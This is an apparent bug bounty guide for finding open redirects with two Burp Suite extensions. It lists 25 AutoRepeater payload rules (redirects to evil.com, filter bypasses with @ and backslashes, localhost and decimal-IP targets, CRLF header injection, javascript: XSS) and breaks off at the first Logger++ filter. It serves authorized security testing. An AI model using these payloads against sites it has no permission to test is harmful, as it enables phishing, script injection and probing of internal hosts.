Finding Open Redirects with Logger++ and AutoRepeater
A practical guide for bug bounty hunters using only Burp Suite extensions.
🎯 Overview
This framework provides complete Open Redirect detection and exploitation using only two Burp Suite extensions:

AutoRepeater: Automatically injects redirect payloads into parameters
Logger++: Filters responses to identify successful redirections

Covers 25+ bypass techniques including: Scheme-relative URLs, @ symbol tricks, backslash confusion, whitelisted domain bypasses, encoding variations, and OAuth redirect_uri exploitation.

💡 Why This Framework?
Most bug hunters miss Open Redirect vulnerabilities because they:

✗ Only test basic ?redirect=https://evil.com
✗ Skip scheme-relative bypasses (//evil.com)
✗ Don't test @ symbol tricks (trusted@evil.com)
✗ Ignore backslash confusion (\\/\\/evil.com)
✗ Miss localhost/internal redirects
✗ Don't test whitelisted domain bypasses
✗ Skip JavaScript-based redirects
✗ Ignore OAuth/OIDC redirect_uri parameters
✗ Don't check for meta refresh redirects
✗ Miss CRLF injection opportunities

This framework tests 25 different redirect techniques simultaneously across all parameters.

⚙️ Requirements
Burp Suite Extensions

AutoRepeater - Download from BApp Store
Logger++ - Download from BApp Store

Target Indicators (High Success)

✓ OAuth/OIDC authentication flows (redirect_uri, callback_url)
✓ Logout/login pages with redirect parameters
✓ Parameters like: url, redirect, next, return, goto, destination, returnTo, continue
✓ /logout, /signin, /signout, /auth/*, /oauth/* endpoints
✓ Link shortener services
✓ External link warning pages


🔧 AutoRepeater Configuration
Setup Instructions

Open Burp Suite → Extensions → AutoRepeater
Create 25 replacement rules (tabs)
Enable all tabs before browsing target
AutoRepeater will test ALL parameters automatically


Tab 1: Basic External Domain

Type: Request Parameter Value
Match: .*
Replace: https://evil.com
Which: Replace All
Regex Match: Enabled
Comment: Basic external domain redirect test


Tab 2: Scheme-Relative URL

Type: Request Parameter Value
Match: .*
Replace: //evil.com
Which: Replace All
Regex Match: Enabled
Comment: Scheme-relative bypass - inherits current protocol


Tab 3: Triple Slash

Type: Request Parameter Value
Match: .*
Replace: ///evil.com
Which: Replace All
Regex Match: Enabled
Comment: Triple slash bypass for filter evasion


Tab 4: Quadruple Slash

Type: Request Parameter Value
Match: .*
Replace: ////evil.com
Which: Replace All
Regex Match: Enabled
Comment: Quadruple slash for aggressive filters


Tab 5: @ Symbol Bypass (Userinfo)

Type: Request Parameter Value
Match: .*
Replace: https://trusted.com@evil.com
Which: Replace All
Regex Match: Enabled
Comment: @ symbol trick - browser goes to evil.com, filter sees trusted.com


Tab 6: @ Symbol Without Scheme

Type: Request Parameter Value
Match: .*
Replace: //trusted.com@evil.com
Which: Replace All
Regex Match: Enabled
Comment: Scheme-relative with @ symbol


Tab 7: Backslash Confusion

Type: Request Parameter Value
Match: .*
Replace: https://trusted.com\@evil.com
Which: Replace All
Regex Match: Enabled
Comment: Backslash instead of forward slash - browser normalizes to /


Tab 8: Double Backslash

Type: Request Parameter Value
Match: .*
Replace: \\evil.com
Which: Replace All
Regex Match: Enabled
Comment: Double backslash bypass


Tab 9: Mixed Slash + Backslash

Type: Request Parameter Value
Match: .*
Replace: \/\/evil.com
Which: Replace All
Regex Match: Enabled
Comment: Forward + backslash combination


Tab 10: Reverse Slash Pattern

Type: Request Parameter Value
Match: .*
Replace: /\/evil.com
Which: Replace All
Regex Match: Enabled
Comment: Slash-backslash-slash pattern


Tab 11: Whitelisted Domain Prefix

Type: Request Parameter Value
Match: .*
Replace: https://evil.com.trusted.com
Which: Replace All
Regex Match: Enabled
Comment: Evil domain with trusted domain as TLD


Tab 12: Whitelisted Domain Suffix

Type: Request Parameter Value
Match: .*
Replace: https://trusted.com.evil.com
Which: Replace All
Regex Match: Enabled
Comment: Trusted domain as subdomain of evil.com


Tab 13: Question Mark Bypass

Type: Request Parameter Value
Match: .*
Replace: https://evil.com?trusted.com
Which: Replace All
Regex Match: Enabled
Comment: Question mark - browser treats trusted.com as query parameter


Tab 14: Hash/Fragment Bypass

Type: Request Parameter Value
Match: .*
Replace: https://evil.com#trusted.com
Which: Replace All
Regex Match: Enabled
Comment: Hash symbol - browser treats trusted.com as fragment


Tab 15: Path Bypass

Type: Request Parameter Value
Match: .*
Replace: https://evil.com/trusted.com
Which: Replace All
Regex Match: Enabled
Comment: Trusted domain in path component


Tab 16: URL Encoded Slash

Type: Request Parameter Value
Match: .*
Replace: https://evil.com%2ftrusted.com
Which: Replace All
Regex Match: Enabled
Comment: URL encoded forward slash


Tab 17: Localhost Redirect

Type: Request Parameter Value
Match: .*
Replace: http://127.0.0.1
Which: Replace All
Regex Match: Enabled
Comment: Redirect to localhost - test internal redirects


Tab 18: Localhost with Trailing Dot

Type: Request Parameter Value
Match: .*
Replace: http://127.0.0.1.
Which: Replace All
Regex Match: Enabled
Comment: Trailing dot bypass for localhost filters


Tab 19: IPv6 Loopback

Type: Request Parameter Value
Match: .*
Replace: http://[::1]
Which: Replace All
Regex Match: Enabled
Comment: IPv6 loopback address


Tab 20: Decimal IP

Type: Request Parameter Value
Match: .*
Replace: http://2130706433
Which: Replace All
Regex Match: Enabled
Comment: Decimal representation of 127.0.0.1


Tab 21: Wildcard DNS (sslip.io)

Type: Request Parameter Value
Match: .*
Replace: http://127.0.0.1.sslip.io
Which: Replace All
Regex Match: Enabled
Comment: Wildcard DNS pointing to 127.0.0.1


Tab 22: CRLF Injection

Type: Request Parameter Value
Match: .*
Replace: %0d%0aLocation:%20https://evil.com
Which: Replace All
Regex Match: Enabled
Comment: CRLF injection to inject Location header


Tab 23: JavaScript Protocol

Type: Request Parameter Value
Match: .*
Replace: javascript:alert(document.domain)
Which: Replace All
Regex Match: Enabled
Comment: JavaScript protocol for XSS via redirect


Tab 24: CRLF + JavaScript

Type: Request Parameter Value
Match: .*
Replace: java%0d%0ascript%0d%0a:alert(1)
Which: Replace All
Regex Match: Enabled
Comment: CRLF to bypass javascript keyword filter


Tab 25: Unicode Normalization

Type: Request Parameter Value
Match: .*
Replace: https://evil.c℀.example.com
Which: Replace All
Regex Match: Enabled
Comment: Unicode character that normalizes to split domains


🔍 Logger++ Filters
Setup Instructions

Open Burp Suite → Extensions → Logger++
Add each filter below
Enable filters while testing
Sort by filter to find successful redirects


Filter 1: HTTP 3xx Redirect Status
